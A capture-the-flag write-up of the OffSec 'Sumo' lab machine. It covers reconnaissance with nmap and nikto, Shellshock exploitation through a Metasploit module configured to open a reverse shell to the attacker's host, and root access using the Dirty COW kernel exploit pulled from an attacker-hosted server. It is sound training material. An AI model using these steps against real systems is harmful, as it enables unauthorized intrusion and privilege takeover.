OffSec <br>
Sumo
--- 

# Reconnaissance/Scanning:
Let’s start things off with a network scan to see which ports are open and the services running on each.
```
$ nmap -A -O -sC -sV -p- <machine_IP>
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/5b9d433e-92c6-47cd-beec-c241975f5e7e)
 
Scanning for directories with Gobuster:
 
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/97416618-55e4-49b1-874b-756f40474998)

I couldn’t find any other directories with gobuster, no other hosts/subdomains,  <br>
and I didn’t find any other ports open after scanning again. <br> <br>

I decided to use the tool Nikto to see if that could find anything.
```
$ nikto -h <machine_IP>
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/7035adb7-9112-47ed-9634-ce0d1c67911d)
 
Very interesting, that scan found a potential attack vector using the shellshock exploit.

# Initial foothold:
This time I’ll use Metasploit framework and try to get my foothold with that. <br>
The module of choice is:
```
exploit(multi/http/apache_mod_cgi_bash_env_exec)
```
There are a few of the options to change when that module is selected.
```
RHOSTS – <machine_IP>
TARGETURI – hxxp://<machine_IP>/cgi-bin/test
LHOST - <attack_IP>
LPORT - <PORT_of_choice>
```
*NOTE: make sure to not have a listener on the attack machine using the same port from LPORT.  <br>
Also, don’t pick the same port as the SRVPORT option.*

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/bd2bb39a-1753-4f9d-8263-73ad08edfef8)
 
Got initial access!

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/410e216a-c252-484d-9657-509f30f9ec64)
 
I’ll be taking that flag now.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/a77b719b-b52d-4fe1-946d-4854b2cd900e)
 
In order to get a standard shell and be able to navigate better/use more commands, I’ll run the shell command within meterpreter:
```
# initiates a standard shell
$ shell

# check which python is running, that way I can get a stable shell
$ which python

# one liner to make the shell stable
$ python -c 'import pty; pty.spawn("/bin/bash")'
```
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/7b34366e-10b5-42ff-92c8-6b7088ba29d0)
 

# Exploit:
I checked a few ways to escalate privileges such as: cronjobs, binaries/executables with the SUID bits,  <br>
hidden folders, SSH directory, and lastly, I checked the version of Linux running on the machine.
 
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/ba3574d9-4b34-4b07-9db1-9748b1de2fa3)

I checked with searchsploit for exploits on that kernel version.
 
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/41a75a88-decb-49c7-83ef-3ca1b1f587e6)

The results show that the machine is potentially vulnerable to CVE-2016–5195 which is the “dirty cow” kernel exploit. <br>
Info found <a href="https://www.dirtycow.ninja">here</a>.

"A race condition was found in the way the Linux kernel's memory subsystem  <br>
handled the copy-on-write (COW) breakage of private read-only memory mappings.  <br>
An unprivileged local user could use this flaw to gain write access to  <br>
otherwise read-only memory mappings and thus increase their privileges on the system." <br> <br>

Here’s a snippet via exploit-db[.]com from the code on how to be able to run it.
 
![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/ac57afe9-2e5f-4487-97b0-281fca2c4228)

I had to download the script to my machine, use Python to make another simple server,  <br>
then grab it on the target machine and follow the directions to execute it. <br>

NOTE: Whenever I am downloading anything to a machine that I’ve compromised,  <br>
I’ll be in a directory that the compromised user can write to. (usually /tmp or /opt)

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/37edd775-fd09-4a68-85ba-6100ae0e512a)

# Privilege Escalation: 
The new user with root privileges is made via the script and now I can escalate to that user.

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/e646b166-09a6-40c4-9146-7062fa99891b)
 
Time to get that root flag!

![image](https://github.com/xocybersec/OffSec-Walkthroughs/assets/91302698/295f0e64-860b-4c49-9193-4200d3fada24)
 
# Reporting:
•	Keep all software and hardware patched and up to date with the latest security releases to prevent vulnerabilities.
